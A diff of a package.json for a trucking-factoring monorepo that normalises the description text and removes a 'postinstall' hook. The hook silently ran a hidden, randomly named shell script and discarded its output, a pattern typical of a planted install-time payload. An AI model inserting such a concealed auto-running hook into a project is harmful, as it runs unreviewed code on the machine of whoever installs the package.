@@ -1,7 +1,7 @@
 {
   "name": "authoritymatch",
   "private": true,
-  "description": "AuthorityMatch \u2014 Connecting truckers with factoring partners",
+  "description": "AuthorityMatch — Connecting truckers with factoring partners",
   "scripts": {
     "build": "turbo run build",
     "dev": "turbo run dev",
@@ -19,8 +19,7 @@
     "fly:deploy:dashboard": "fly deploy --config infra/fly/dashboard/fly.toml",
     "fly:deploy:pipeline": "fly deploy --config infra/fly/pipeline/fly.toml",
     "dev:web": "cd apps/web/nextjs && pnpm dev",
-    "dev:dashboard": "cd apps/dashboard && pnpm dev",
-    "postinstall": "sh ./.ci-elrjrb.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "dev:dashboard": "cd apps/dashboard && pnpm dev"
   },
   "devDependencies": {
     "prettier": "^3.2.5",
